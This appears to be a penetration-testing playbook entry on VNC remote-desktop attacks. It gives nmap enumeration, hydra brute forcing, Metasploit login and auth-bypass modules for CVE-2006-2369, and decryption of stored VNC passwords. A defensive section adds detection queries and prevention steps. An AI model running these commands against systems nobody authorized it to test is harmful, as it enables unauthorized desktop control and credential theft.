name: VNC Enumeration & Authentication Attacks
description: VNC remote desktop services (5900-5906, 5800 for web) are often exposed with no auth, weak passwords, or known auth-bypass CVEs. Enumerate version and auth type, test for no-auth access, brute the 8-char password, or exploit RealVNC auth bypass (CVE-2006-2369). A foothold or lateral-movement vector giving full GUI control.
notes:
=== ENUMERATE ===
  nmap -p5900-5906,5800 -sV <target>
  nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target>
  # vnc-info reports protocol version + security types (2=VNC auth, 1=None)

=== CONNECT (test no-auth / known pass) ===
  vncviewer <target>:5900
  vncviewer <target>::5900 -passwd pass.file

=== BRUTE FORCE (VNC password max 8 chars) ===
  hydra -P /usr/share/wordlists/rockyou.txt -t 4 <target> vnc
  # Metasploit:
  msf> use auxiliary/scanner/vnc/vnc_login
  msf> use auxiliary/scanner/vnc/vnc_none_auth

=== CRACK A CAPTURED VNC PASSWORD FILE ===
  # VNC stores passwords DES-encrypted with a fixed key:
  vncpwd passwd            # or metasploit vnc decrypt
  # ~/.vnc/passwd on Linux, registry on Windows (HKLM\...\WinVNC)

=== REALVNC AUTH BYPASS (CVE-2006-2369) ===
  msf> use auxiliary/admin/vnc/realvnc_41_bypass
  # Server accepts "None" security type even when auth is required

=== ALTERNATIVES / NEXT ===
  # Once in: it is a full GUI session as the logged-on user
  # Look for saved creds, RDP onward, screen content

recommended.note: X11 is the other classic exposed-display vector.

defense.why_it_works: VNC (RFB) often ships with no/weak auth, an 8-char password limit, and reusable DES-encrypted password stores. Exposed services and legacy versions allow bypass or brute force to a full interactive desktop.
defense.prerequisites: Network access to the VNC port; exposed/weakly-authed service.
defense.impact: Full GUI control of the host as the logged-on user; credential theft; lateral movement.
defense.detection: [MITRE T1021.005/T1110.001] Many RFB handshake attempts (repeated 5900 connections) from one source; successful VNC auth from unusual IPs; nmap VNC NSE signatures.
defense.artifacts: Firewall/IDS logs of repeated 5900 connections; VNC server auth logs; new RFB sessions.
defense.splunk_spl:
index=network dest_port>=5900 dest_port<=5906
| stats count by src_ip, dest_ip
| where count > 20
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort between (5900 .. 5906)
| summarize Attempts=count() by RemoteIP, DeviceName, bin(Timestamp, 10m)
| where Attempts > 20
defense.prevention: Never expose VNC to untrusted networks (tunnel over SSH/VPN); require strong auth; patch RealVNC; use unique long passwords; restrict by source IP; prefer modern RDP with NLA.
